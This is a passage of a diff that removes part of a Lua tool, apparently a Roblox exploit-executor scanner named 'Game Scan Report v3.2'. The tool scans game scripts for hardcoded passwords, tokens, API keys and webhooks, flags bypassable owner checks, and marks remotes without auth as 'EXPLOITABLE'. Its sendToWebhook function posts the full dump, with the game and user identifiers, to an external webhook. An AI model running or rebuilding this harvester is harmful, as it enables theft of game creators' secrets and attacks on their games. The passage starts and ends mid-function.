-    if bc >= 3 then r[#r+1] = { lvl = "HIGH", desc = "string.byte/char loop (obfuscation) count=" .. bc } end
-    local xc = 0
-    for _ in src:gmatch("bit32%.bxor") do xc = xc + 1 end
-    for _ in src:gmatch("bit%.bxor") do xc = xc + 1 end
-    if xc >= 2 then r[#r+1] = { lvl = "HIGH", desc = "bit32/bit.bxor usage (obfuscation) count=" .. xc } end
-    if src:find("loadstring") and (src:find("string%.byte") or src:find("string%.char") or src:find("bit32")) then
-        r[#r+1] = { lvl = "CRITICAL", desc = "loadstring + byte/bit ops (self-decrypt)" }
-    end
-    if src:find("getfenv") and src:find("load") then
-        r[#r+1] = { lvl = "CRITICAL", desc = "getfenv + load (sandbox escape + obfuscation)" }
-    end
-    local hc = 0
-    for _ in src:gmatch("base64") do hc = hc + 1 end
-    for _ in src:gmatch("sha384") do hc = hc + 1 end
-    for _ in src:gmatch("sha256") do hc = hc + 1 end
-    for _ in src:gmatch("md5") do hc = hc + 1 end
-    for _ in src:gmatch("sha3") do hc = hc + 1 end
-    for _ in src:gmatch("xxhash") do hc = hc + 1 end
-    if hc >= 1 then r[#r+1] = { lvl = "MEDIUM", desc = "Crypto/hash functions (anti-tamper)" } end
-    if src:find("table%.concat") and (src:find("string%.rep") or src:find("string%.sub")) then
-        r[#r+1] = { lvl = "LOW", desc = "String assembly pattern" }
-    end
-    local ec = 0
-    for _ in src:gmatch("string%.reverse") do ec = ec + 1 end
-    for _ in src:gmatch("string%.gsub") do ec = ec + 1 end
-    for _ in src:gmatch("string%.split") do ec = ec + 1 end
-    if ec >= 4 then r[#r+1] = { lvl = "LOW", desc = "Heavy string manipulation count=" .. ec } end
-    if src:find("math%.random") and (src:find("table%.sort") or src:find("table%.insert")) then
-        r[#r+1] = { lvl = "MEDIUM", desc = "Random + table shuffle pattern" }
-    end
-    if src:find("gmatch") and src:find("gsub") and bc >= 2 then
-        r[#r+1] = { lvl = "HIGH", desc = "gmatch+gsub+byte transform chain" }
-    end
-    return r
-end
-
-local function detectHooks(src)
-    local r = {}
-    if type(src) ~= "string" or #src == 0 then return r end
-    if src:find("hookfunction") then r[#r+1] = { lvl = "CRITICAL", desc = "hookfunction used" } end
-    if src:find("newcclosure") then r[#r+1] = { lvl = "MEDIUM", desc = "newcclosure used" } end
-    if src:find("clonefunction") or src:find("replaceclosure") then r[#r+1] = { lvl = "MEDIUM", desc = "Function cloning/replacement" } end
-    if src:find("getrawmetatable") then r[#r+1] = { lvl = "MEDIUM", desc = "getrawmetatable - metatable tampering" } end
-    if src:find("__metatable") then r[#r+1] = { lvl = "MEDIUM", desc = "__metatable locked" } end
-    if src:find("__index") and (src:find("hook") or src:find("original")) then r[#r+1] = { lvl = "MEDIUM", desc = "__index override detected" } end
-    if src:find("__newindex") and (src:find("hook") or src:find("original")) then r[#r+1] = { lvl = "MEDIUM", desc = "__newindex override detected" } end
-    if src:find("setreadonly") and src:find("metatable") then r[#r+1] = { lvl = "MEDIUM", desc = "Metatable readonly bypass" } end
-    if src:find("debug%.setmetatable") or src:find("debug%.getmetatable") then r[#r+1] = { lvl = "LOW", desc = "debug.set/getmetatable" } end
-    if src:find("hookmetamethod") then r[#r+1] = { lvl = "CRITICAL", desc = "hookmetamethod - metahook injection" } end
-    if src:find("setrawmetatable") then r[#r+1] = { lvl = "HIGH", desc = "setrawmetatable - raw metatable write" } end
-    if src:find("setreadonly") then r[#r+1] = { lvl = "MEDIUM", desc = "setreadonly - bypass read-only" } end
-    if src:find("getsenv") or src:find("getrenv") then r[#r+1] = { lvl = "HIGH", desc = "Environment access (getsenv/getrenv)" } end
-    if src:find("setupvalue") then r[#r+1] = { lvl = "MEDIUM", desc = "setupvalue - upvalue modification" } end
-    if src:find("getupvalue") then r[#r+1] = { lvl = "MEDIUM", desc = "getupvalue - upvalue reading" } end
-    if src:find("getconstants") then r[#r+1] = { lvl = "MEDIUM", desc = "getconstants - constant extraction" } end
-    if src:find("getscriptbytecode") then r[#r+1] = { lvl = "MEDIUM", desc = "getscriptbytecode - bytecode reading" } end
-    if src:find("setclipboard") then r[#r+1] = { lvl = "LOW", desc = "setclipboard - clipboard access" } end
-    return r
-end
-
-local function deepAnalyze(src)
-    local r = { creds = {}, chatCmds = {}, vulns = {}, extConns = {}, assetCtx = {}, antiCheat = {}, obfuscation = {}, hooks = {} }
-    if type(src) ~= "string" or #src == 0 then return r end
-    pcall(function()
-        for id in src:gmatch("UserId%s*=%s*(%d+)") do
-            if tonumber(id) and #id > 5 then r.creds[#r.creds+1] = "Hardcoded UserId: " .. id end
-        end
-        if src:find("game%.CreatorId") and src:find("UserId") then r.creds[#r.creds+1] = "Owner check - bypassable (game.CreatorId vs UserId)" end
-        for var, val in src:gmatch("([%w_]+)%s*=%s*\"([^\"]+)\"") do
-            local lv = var:lower()
-            if lv:find("pass") or lv:find("secret") or lv:find("token") or lv:find("key") and not lv:find("keyboard") then
-                r.creds[#r.creds+1] = "Suspicious var: " .. var .. "=\"" .. trunc(val, 60) .. "\""
-            end
-        end
-        for _, p in ipairs({ "password", "passwd", "pwd", "apikey", "api_key", "webhook", "discord", "token" }) do
-            for val in src:gmatch(p .. "%s*[:=]%s*\"([^\"]+)\"") do
-                if #val > 3 then r.creds[#r.creds+1] = p .. ": \"" .. trunc(val, 60) .. "\"" end
-            end
-        end
-    end)
-    pcall(function()
-        if src:find("Chatted") then
-            for cmd in src:gmatch("\"([/%!]%w+)\"") do r.chatCmds[#r.chatCmds+1] = cmd end
-            for cmd in src:gmatch("'([/%!]%w+)'") do r.chatCmds[#r.chatCmds+1] = cmd end
-            for cmd in src:gmatch("FindFirstChild%(\"([^\"]+)\"%)") do r.chatCmds[#r.chatCmds+1] = "CmdObj: " .. cmd end
-        end
-        if src:find("ChatService") then
-            for cmd in src:gmatch("\"([/%!]%w+)\"") do r.chatCmds[#r.chatCmds+1] = cmd end
-        end
-    end)
-    pcall(function()
-        if src:find("FireAllClients") then r.vulns[#r.vulns+1] = { lvl = "CRITICAL", desc = "FireAllClients - server broadcasts to all", scr = 5 } end
-        if src:find("loadstring") then r.vulns[#r.vulns+1] = { lvl = "CRITICAL", desc = "loadstring - code injection risk", scr = 5 } end
-        if src:find("Getfenv") or src:find("setfenv") then r.vulns[#r.vulns+1] = { lvl = "HIGH", desc = "getfenv/setfenv - sandbox escape", scr = 4 } end
-        if src:find("HttpService") and (src:find("GetAsync") or src:find("PostAsync")) then r.vulns[#r.vulns+1] = { lvl = "HIGH", desc = "HttpService external request", scr = 4 } end
-        if src:find("UpdateAsync") or src:find("SetAsync") then r.vulns[#r.vulns+1] = { lvl = "HIGH", desc = "DataStore Set/Update - injection risk", scr = 4 } end
-        if src:find("debug%.") then r.vulns[#r.vulns+1] = { lvl = "MEDIUM", desc = "debug.* - sandbox escape potential", scr = 3 } end
-        if src:find("loadinstance") then r.vulns[#r.vulns+1] = { lvl = "MEDIUM", desc = "loadinstance - binary object load", scr = 3 } end
-        if src:find("HttpGetAsync") then r.vulns[#r.vulns+1] = { lvl = "MEDIUM", desc = "HttpGetAsync - web request", scr = 3 } end
-        if src:find("HttpPostAsync") then r.vulns[#r.vulns+1] = { lvl = "MEDIUM", desc = "HttpPostAsync - web post", scr = 3 } end
-        if src:find("Delay") and src:find("string") then r.vulns[#r.vulns+1] = { lvl = "LOW", desc = "Delay with string arg - legacy risk", scr = 2 } end
-        if src:find("tostring") and src:find("load") then r.vulns[#r.vulns+1] = { lvl = "HIGH", desc = "load(tostring(...)) - dynamic code load", scr = 4 } end
-        if src:find("FireServer") and src:find("compromised") then r.vulns[#r.vulns+1] = { lvl = "CRITICAL", desc = "FireServer + compromised check", scr = 5 } end
-        if src:find("FireServer") and src:find("cheat") then r.vulns[#r.vulns+1] = { lvl = "HIGH", desc = "FireServer + cheat keyword", scr = 4 } end
-        if src:find("SetAttribute") and (src:find("exploit") or src:find("cheat")) then r.vulns[#r.vulns+1] = { lvl = "HIGH", desc = "Attribute-based exploit tagging", scr = 4 } end
-        if src:find("ContentProvider") and src:find("Preload") then r.vulns[#r.vulns+1] = { lvl = "LOW", desc = "ContentProvider:Preload usage", scr = 2 } end
-        if src:find("RobloxReplicatedStorage") or src:find("RobloxServerStorage") then r.vulns[#r.vulns+1] = { lvl = "MEDIUM", desc = "Direct Roblox storage references", scr = 3 } end
-        if src:find("GetRemoteEventAndParams") then r.vulns[#r.vulns+1] = { lvl = "MEDIUM", desc = "Remote parameter inspection", scr = 3 } end
-        if src:find("Disconnect") and src:find("warn") then r.vulns[#r.vulns+1] = { lvl = "LOW", desc = "Disconnect + warn (disconnection logging)", scr = 2 } end
-        if src:find("GetDebugId") then r.vulns[#r.vulns+1] = { lvl = "LOW", desc = "GetDebugId - instance tracking", scr = 2 } end
-        if src:find("GetFullName") then r.vulns[#r.vulns+1] = { lvl = "LOW", desc = "GetFullName - path exposure", scr = 2 } end
-    end)
-    pcall(function()
-        for url in src:gmatch("https?://[^\"'%)%s]+") do
-            local clean = url:gsub("[^%w%.:/%%~%-_?&=#]", "")
-            if #clean > 8 then r.extConns[#r.extConns+1] = clean end
-        end
-        for pid in src:gmatch("TeleportService:Teleport%((%d+)") do r.extConns[#r.extConns+1] = "Teleport -> PlaceId: " .. pid end
-        for pid in src:gmatch("TeleportToPlaceInstance%((%d+)") do r.extConns[#r.extConns+1] = "TeleportInstance -> PlaceId: " .. pid end
-        for sid in src:gmatch("GetProductInfo%((%d+)") do r.extConns[#r.extConns+1] = "Marketplace lookup -> " .. sid end
-        for url in src:gmatch('HttpService:GetAsync%("([^"]*)"%)') do r.extConns[#r.extConns+1] = "HTTP Get: " .. trunc(url, 80) end
-        for url in src:gmatch('HttpService:PostAsync%("([^"]*)"%)') do r.extConns[#r.extConns+1] = "HTTP Post: " .. trunc(url, 80) end
-        for url in src:gmatch('HttpService:RequestAsync%({[^}]*url%s*=%s*"([^"]*)"') do r.extConns[#r.extConns+1] = "HTTP Request: " .. trunc(url, 80) end
-        if src:find("TweenService") then r.extConns[#r.extConns+1] = "TweenService used (animation/timing)" end
-        if src:find("MemoryStore") then r.extConns[#r.extConns+1] = "MemoryStoreService - cross-server state" end
-        if src:find("BindableEvent") or src:find("BindableFunction") then r.extConns[#r.extConns+1] = "BindableEvent/Function (in-process IPC)" end
-        if src:find("UnreliableRemoteEvent") then r.extConns[#r.extConns+1] = "UnreliableRemoteEvent used" end
-        for sid in src:gmatch("GroupService:GetGroupAsync%((%d+)") do r.extConns[#r.extConns+1] = "Group lookup -> " .. sid end
-        for sid in src:gmatch("GetGroupInfoAsync%((%d+)") do r.extConns[#r.extConns+1] = "GroupInfo lookup -> " .. sid end
-        for sid in src:gmatch("GetRoleInGroup%((%d+)") do r.extConns[#r.extConns+1] = "Group role check -> " .. sid end
-        if src:find("PromptPurchase") or src:find("PromptProductPurchase") then r.extConns[#r.extConns+1] = "Purchase prompt - monetization" end
-        if src:find("ImGui") or src:find("imgui") then r.extConns[#r.extConns+1] = "ImGui usage" end
-        if src:find("CTRL") or src:find("lctrl") or src:find("Enum%.KeyCode") then r.extConns[#r.extConns+1] = "Keyboard input capture" end
-    end)
-    pcall(function()
-        for line in src:gmatch("[^\n]*rbxassetid://%d+[^\n]*") do
-            local id = line:match("rbxassetid://(%d+)")
-            local ctx = trunc(line, 90)
-            if id then r.assetCtx[#r.assetCtx+1] = "Asset " .. id .. ": " .. ctx end
-        end
-        for line in src:gmatch("[^\n]*rbxasset://%d+[^\n]*") do
-            local id = line:match("rbxasset://(%d+)")
-            local ctx = trunc(line, 90)
-            if id then r.assetCtx[#r.assetCtx+1] = "Asset " .. id .. ": " .. ctx end
-        end
-        for line in src:gmatch("http://[^\n\"']*roblox%.com[^\n\"']*") do
-            r.assetCtx[#r.assetCtx+1] = "HTTP Asset URL: " .. trunc(line, 90)
-        end
-    end)
-    r.antiCheat = detectAntiCheat(src)
-    r.obfuscation = detectObfuscation(src)
-    r.hooks = detectHooks(src)
-    return r
-end
-
-local function isBytecode(src)
-    local ok, sig = pcall(string.char, 27, 76, 117, 97)
-    return ok and src:sub(1, 4) == sig
-end
-
-local function analyzeSource(src)
-    local r = { assets = {}, gamepass = {}, devprod = {}, badge = {}, services = {}, remotes = {}, requires = {}, tags = {}, keywords = {}, libraries = {}, dynamicRemote = false, isConfig = false, remoteCreations = {}, sharedVars = {} }
-    if type(src) ~= "string" or #src == 0 then return r end
-    if isBytecode(src) then r.keywords["BYTECODE"] = true end
-    r.remoteCreations = extractRemoteCreation(src)
-    local dyn = extractDynamicRemotePatterns(src)
-    if dyn.dynamicTable or dyn.dynamicCall or dyn.indexedAccess or dyn.constructorAccess then r.dynamicRemote = true end
-    r.sharedVars = extractSharedVarAccess(src)
-    local stripped = src:match("%s*(.-)%s*$")
-    if stripped and stripped:match("^return%s*{") and stripped:match("}%s*$") then r.isConfig = true end
-    for id in src:gmatch("rbxassetid://(%d+)") do local n = tonumber(id); if n then r.assets[n] = true end end
-    for id in src:gmatch("rbxasset://(%d+)") do local n = tonumber(id); if n then r.assets[n] = true end end
-    for id in src:gmatch("[Gg]amepass[Ii][Dd]%s*=%s*(%d+)") do local n = tonumber(id); if n then r.gamepass[n] = true end end
-    for id in src:gmatch("[Dd]ev[Pp]roduct[Ii][Dd]%s*=%s*(%d+)") do local n = tonumber(id); if n then r.devprod[n] = true end end
-    for id in src:gmatch("[Bb]adge[Ii][Dd]%s*=%s*(%d+)") do local n = tonumber(id); if n then r.badge[n] = true end end
-    for s in src:gmatch('[gG]ame:GetService%("([^"]*)"%)') do r.services[s] = true end
-    if src:find("FireServer") then r.keywords["FireServer"] = true end
-    if src:find("InvokeServer") then r.keywords["InvokeServer"] = true end
-    if src:find("DataStore") then r.keywords["DataStore"] = true end
-    if src:find("MessagingService") then r.libraries["Messaging"] = true end
-    if src:find("MarketplaceService") then r.libraries["Marketplace"] = true end
-    if src:find("MemoryStoreService") then r.libraries["MemoryStore"] = true end
-    if src:find("TeleportService") then r.libraries["Teleport"] = true end
-    if src:find("GroupService") then r.libraries["Group"] = true end
-    if src:find("FriendService") then r.libraries["Friend"] = true end
-    if src:find("TextChatService") or src:find("ChatService") then r.libraries["Chat"] = true end
-    if src:find("TweenService") then r.libraries["Tween"] = true end
-    if src:find("RunService") then r.libraries["RunService"] = true end
-    if src:find("ReplicatedStorage") and not src:find("GetService") then r.libraries["ReplicatedStorage"] = true end
-    if src:find("ServerScriptService") then r.libraries["ServerScriptService"] = true end
-    if src:find("StarterPlayerScripts") then r.libraries["StarterPlayer"] = true end
-    if #src < 10 then r.tags["EMPTY_SCRIPT"] = true end
-    if src:find("wait%(999999") or src:find("wait(999999") then r.tags["INF_WAIT"] = true end
-    r.remotes = extractRemoteCalls(src)
-    r.requires = extractRequires(src)
-    r.tags = extractTags(src)
-    return r
-end
-
-local function sendToWebhook(report)
-    if not _request or not WEBHOOK_SECRET or #WEBHOOK_SECRET == 0 then return false end
-    local ok, res = pcall(function()
-        local gn = getGameName():gsub("[^%w _-]", ""):sub(1, 60)
-        if #gn == 0 then gn = "Game" end
-        local j = HttpService and HttpService:JSONEncode({ username = "Scanner", embeds = {{ title = gn .. " Dump", description = #report .. " bytes", color = 0x5865F2, footer = { text = "place: " .. tostring(game.PlaceId) } } } }) or "{}"
-        local b = "----Bound" .. math.random(100000, 999999)
-        local data = "--" .. b .. "\r\nContent-Disposition: form-data; name=\"payload_json\"\r\nContent-Type: application/json\r\n\r\n" .. j .. "\r\n--" .. b .. "\r\nContent-Disposition: form-data; name=\"files[0]\"; filename=\"" .. gn .. ".txt\"\r\nContent-Type: text/plain\r\n\r\n" .. report .. "\r\n--" .. b .. "--\r\n"
-        _request({ Url = WEBHOOK_SECRET, Method = "POST", Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. b }, Body = data })
-    end)
-    return ok
-end
-
-local function sendChunkedReport(report)
-    if not _request or not WEBHOOK_SECRET then return false end
-    return sendToWebhook(report)
-end
-
-local function buildReport(r)
-    local p = {
-        "============================================================\n",
-        "               GAME SCAN REPORT v3.2\n",
-        "============================================================\n",
-        "Game Name   : " .. r.gameName .. "\n",
-        "Place ID    : " .. tostring(game.PlaceId) .. "\n",
-        "Job ID      : " .. tostring(game.JobId) .. "\n",
-        "Date/Time   : " .. os.date("%Y-%m-%d %H:%M:%S") .. "\n",
-        "Server Age  : " .. string.format("%.1f", workspace.DistributedGameTime) .. "s\n",
-        "Players     : " .. #Players:GetPlayers() .. " / " .. tostring(Players.MaxPlayers) .. "\n",
-        "Decompiled By: " .. (LP and LP.Name or "Unknown") .. " (" .. (LP and LP.DisplayName or "Unknown") .. ")\n",
-        "User ID     : " .. (LP and tostring(LP.UserId) or "Unknown") .. "\n",
-        "------------------------------------------------------------\n",
-        "STATISTICS:\n",
-        "  Total Instances : " .. r.total .. "\n",
-        "  Part/Mesh/Union : " .. r.parts .. "\n",
-        "  Model           : " .. r.models .. "\n",
-        "  Folder          : " .. r.folders .. "\n",
-        "  Script          : " .. #r.scripts .. "\n",
-        "  Remote          : " .. #r.remotes .. "\n",
-        "  Value           : " .. #r.values .. "\n",
-        "============================================================\n\n",
-    }
-
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    p[#p+1] = " SCRIPT PATHS  (" .. #r.scripts .. ")\n"
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    if #r.scripts == 0 then p[#p+1] = "  (none)\n" else
-        local bySvc = {}; local svcOrder = {}
-        for _, v in ipairs(r.scripts) do
-            local svc = v.path:match("^game%.([^%.]+)") or "Unknown"
-            if not bySvc[svc] then bySvc[svc] = {}; svcOrder[#svcOrder+1] = svc end
-            bySvc[svc][#bySvc[svc]+1] = v
-        end
-        for _, svc in ipairs(svcOrder) do
-            local list = bySvc[svc]
-            p[#p+1] = "\n  -- " .. svc .. " (" .. #list .. " scripts)\n"
-            for i, v in ipairs(list) do
-                local prefix = i == #list and "  +-- " or "  |-- "
-                p[#p+1] = string.format("  %s[%s] %s  (via: %s)\n", prefix, v.t, v.path, v.method)
-                if v.tags and #v.tags > 0 then p[#p+1] = "  " .. string.rep(" ", #prefix) .. "Tags: " .. table.concat(v.tags, ", ") .. "\n" end
-                if v.remoteCalls and #v.remoteCalls > 0 then
-                    for _, rc in ipairs(v.remoteCalls) do
-                        p[#p+1] = "  " .. string.rep(" ", #prefix) .. "  -> " .. rc.type .. ": " .. rc.remote .. "(" .. rc.args .. " args)\n"
-                    end
-                end
-            end
-        end
-    end
-    p[#p+1] = "\n"
-
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    p[#p+1] = " REMOTE & BINDABLE  (" .. #r.remotes .. ")\n"
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    if #r.remotes == 0 then p[#p+1] = "  (none)\n" else
-        for _, v in ipairs(r.remotes) do p[#p+1] = "  > " .. tostring(v) .. "\n" end
-    end
-    p[#p+1] = "\n"
-
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    p[#p+1] = " CROSS-REFERENCE: FIRESERVER -> HANDLER + AUTH\n"
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    local xrCount = 0
-    for _, v in ipairs(r.scripts) do
-        if v.remoteCalls then
-            for _, rc in ipairs(v.remoteCalls) do
-                if rc.handlers then
-                    xrCount = xrCount + 1
-                    local authTag = rc.hasAuth and " [AUTH: YES]" or " [AUTH: NO - EXPLOITABLE]"
-                    p[#p+1] = string.format("  %s -> %d handler(s) | AuthScore=%d%s\n", rc.remote, #rc.handlers, rc.maxAuth or 0, authTag)
-                    for _, h in ipairs(rc.handlers) do
-                        local checks = ""
-                        if h.auth and #h.auth.checks > 0 then checks = " {" .. table.concat(h.auth.checks, ",") .. "}" end
-                        p[#p+1] = string.format("    Handler: %s (%s) score=%d%s\n", h.scriptPath, h.handlerType, h.auth.score, checks)
-                    end
-                end
-            end
-        end
-    end
-    if xrCount == 0 then p[#p+1] = "  (No remote-to-handler matches found)\n" end
-    p[#p+1] = "\n"
-
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    p[#p+1] = " FIRESERVER / INVOKESERVER CALLS\n"
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    local rcCount = 0
-    for _, v in ipairs(r.scripts) do if v.remoteCalls then rcCount = rcCount + #v.remoteCalls end end
-    if rcCount == 0 then p[#p+1] = "  (none)\n" else
-        local byRemote = {}
-        for _, v in ipairs(r.scripts) do
-            if v.remoteCalls then
-                for _, rc in ipairs(v.remoteCalls) do
-                    if not byRemote[rc.remote] then byRemote[rc.remote] = {} end
-                    byRemote[rc.remote][#byRemote[rc.remote]+1] = rc
-                end
-            end
-        end
-        local sorted = {}
-        for k in pairs(byRemote) do sorted[#sorted+1] = k end
-        table.sort(sorted)
-        for _, rm in ipairs(sorted) do
-            local calls = byRemote[rm]
-            p[#p+1] = string.format("  %s  (%d calls)\n", rm, #calls)
-            local seen = {}
-            for _, rc in ipairs(calls) do
-                local key = rc.type .. "|" .. rc.args
-                if not seen[key] then
-                    seen[key] = true
-                    p[#p+1] = string.format("    %s(%s)  args=%d\n", rc.type, rc.argsStr, rc.args)
-                end
-            end
-        end
-    end
-    p[#p+1] = "\n"
-
-    local allTags = {}
-    for _, v in ipairs(r.scripts) do for tag in pairs(v.tags or {}) do allTags[tag] = true end end
-    local tagList = {}; for k in pairs(allTags) do tagList[#tagList+1] = k end; table.sort(tagList)
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    p[#p+1] = " COLLECTIONSERVICE TAGS  (" .. #tagList .. ")\n"
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    if #tagList == 0 then p[#p+1] = "  (none)\n" else for _, t in ipairs(tagList) do p[#p+1] = "  > " .. t .. "\n" end end
-    p[#p+1] = "\n"
-
-    local allReq = {}; local reqOrder = {}
-    for _, v in ipairs(r.scripts) do
-        for path in pairs(v.requires or {}) do
-            if not allReq[path] then allReq[path] = #reqOrder + 1; reqOrder[#reqOrder+1] = path end
-        end
-    end
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    p[#p+1] = " REQUIRE() MODULES  (" .. #reqOrder .. ")\n"
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    if #reqOrder == 0 then p[#p+1] = "  (none)\n" else
-        for _, mod in ipairs(reqOrder) do
-            p[#p+1] = "  > " .. mod .. "\n"
-            local callers = r.moduleRefs and r.moduleRefs[mod]
-            if callers and #callers > 0 then
-                for _, caller in ipairs(callers) do p[#p+1] = "      required by: " .. caller .. "\n" end
-            end
-        end
-    end
-    p[#p+1] = "\n"
-
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    p[#p+1] = " MODULE DEPENDENCY TREE  (" .. tostring(r.moduleCount or 0) .. " modules)\n"
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    if not r.moduleRefs or r.moduleCount == 0 then
-        p[#p+1] = "  (none)\n"
-    else
-        local modOrder = {}
-        for k in pairs(r.moduleRefs) do modOrder[#modOrder+1] = k end
-        table.sort(modOrder)
-        for _, mod in ipairs(modOrder) do
-            local callers = r.moduleRefs[mod]
-            p[#p+1] = string.format("  [%d caller(s)] %s\n", #callers, mod)
-            if #callers <= 5 then
-                for _, c in ipairs(callers) do p[#p+1] = "    <- " .. c .. "\n" end
-            else
-                for i = 1, 5 do p[#p+1] = "    <- " .. callers[i] .. "\n" end
-                p[#p+1] = string.format("    ... +%d more\n", #callers - 5)
-            end
-        end
-    end
-    p[#p+1] = "\n"
-
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    p[#p+1] = " DEPENDENCY GRAPH  (per-script service/remote/module tree)\n"
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    if #r.scripts == 0 then p[#p+1] = "  (none)\n" else
-        local depCount = 0
-        for _, v in ipairs(r.scripts) do
-            local deps = {}
-            if v.remoteCalls and #v.remoteCalls > 0 then
-                for _, rc in ipairs(v.remoteCalls) do deps[#deps+1] = "Fire: " .. rc.remote end
-            end
-            if v.requires and next(v.requires) then
-                for rp in pairs(v.requires) do deps[#deps+1] = "Req: " .. rp end
-            end
-            if v.dynamicRemote then deps[#deps+1] = "[DYNAMIC REMOTE]" end
-            if v.isConfig then deps[#deps+1] = "[CONFIG MODULE]" end
-            if #deps > 0 then
-                depCount = depCount + 1
-                p[#p+1] = string.format("  %s (%d deps)\n", v.path, #deps)
-                for _, d in ipairs(deps) do p[#p+1] = "    +-- " .. d .. "\n" end
-            end
-        end
-        if depCount == 0 then p[#p+1] = "  (no dependencies found)\n" end
-    end
-    p[#p+1] = "\n"
-
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    p[#p+1] = " INSTANCE RELATIONSHIP MAP\n"
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    local relCount = (#r.detectors) + (#r.promptParents) + (#r.buttons)
-    if relCount == 0 then p[#p+1] = "  (none)\n" else
-        if #r.detectors > 0 then
-            p[#p+1] = "  CLICK DETECTORS:\n"
-            for _, d in ipairs(r.detectors) do p[#p+1] = "    " .. d .. "\n" end
-        end
-        if #r.promptParents > 0 then
-            p[#p+1] = "  PROXIMITY PROMPTS:\n"
-            for _, d in ipairs(r.promptParents) do p[#p+1] = "    " .. d .. "\n" end
-        end
-        if #r.buttons > 0 then
-            local bCount = math.min(#r.buttons, 20)
-            p[#p+1] = "  BUTTONS (ilk " .. bCount .. "):\n"
-            for i = 1, bCount do p[#p+1] = "    " .. r.buttons[i] .. "\n" end
-            if #r.buttons > bCount then p[#p+1] = "    ... +" .. (#r.buttons - bCount) .. " more\n" end
-        end
-    end
-    p[#p+1] = "\n"
-
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    p[#p+1] = " CREDENTIAL SCANNER  (" .. #r.creds .. " findings)\n"
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    if #r.creds == 0 then p[#p+1] = "  (none)\n" else
-        for _, v in ipairs(r.creds) do p[#p+1] = "  > " .. v .. "\n" end
-    end
-    p[#p+1] = "\n"
-
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    p[#p+1] = " ADMIN PANEL DETECTOR  (" .. #r.adminPanels .. " panels)\n"
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    if #r.adminPanels == 0 then p[#p+1] = "  (none)\n" else
-        for _, v in ipairs(r.adminPanels) do p[#p+1] = "  > " .. v .. "\n" end
-    end
-    p[#p+1] = "\n"
-
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    p[#p+1] = " CHAT COMMAND REVERSING  (" .. #r.chatCmds .. " commands)\n"
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    if #r.chatCmds == 0 then p[#p+1] = "  (none)\n" else
-        local seen = {}
-        for _, v in ipairs(r.chatCmds) do
-            if not seen[v] then seen[v] = true; p[#p+1] = "  > " .. v .. "\n" end
-        end
-    end
-    p[#p+1] = "\n"
-
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    p[#p+1] = " VULNERABILITY AUDIT  (" .. #r.vulns .. " vulns)\n"
-    p[#p+1] = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-    if #r.vulns == 0 then p[#p+1] = "  (none)\n" else
-        local order = { CRITICAL = 1, HIGH = 2, MEDIUM = 3, LOW = 4 }
-        table.sort(r.vulns, function(a, b) return (order[a.lvl] or 5) < (order[b.lvl] or 5) end)
-        for _, v in ipairs(r.vulns) do
-            local tag = ""
